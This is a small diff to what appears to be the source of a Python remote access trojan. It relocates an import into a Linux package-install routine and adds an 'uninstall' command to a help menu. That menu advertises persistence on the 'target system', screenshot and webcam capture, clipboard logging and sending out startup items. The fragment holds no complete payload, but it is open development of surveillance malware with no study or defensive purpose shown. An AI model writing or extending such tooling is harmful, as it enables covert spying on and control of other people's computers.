@@ -9,7 +9,6 @@ import threading
 import logging
 import platform
 import os
-import requests
 import traceback
 # presistance
 from typing import Union
@@ -89,7 +88,8 @@ def install_required_packages():
                 install_package("opencv-python")
         elif platform.system().startswith("Linux"):
             print("Uses Linux")
-            try:
+            try: 
+                import requests
                 import pygrabshot
                 from PIL import Image
                 import pyautogui
@@ -678,6 +678,7 @@ def execute_command(command):
         screenshot2         | Updated Way Of Capturing Screenshot
         kill                | Will Disconnect Client From Server
         install             | Adds presistance to target system
+        uninstall           | Removes presistance from target system
         startup             | Sends A File Containing All Startup Items
         webcam              | Grabs A Picture From Webcam And Sends It.
         cliplogger help     | Gets Help Menu For Cliplogger
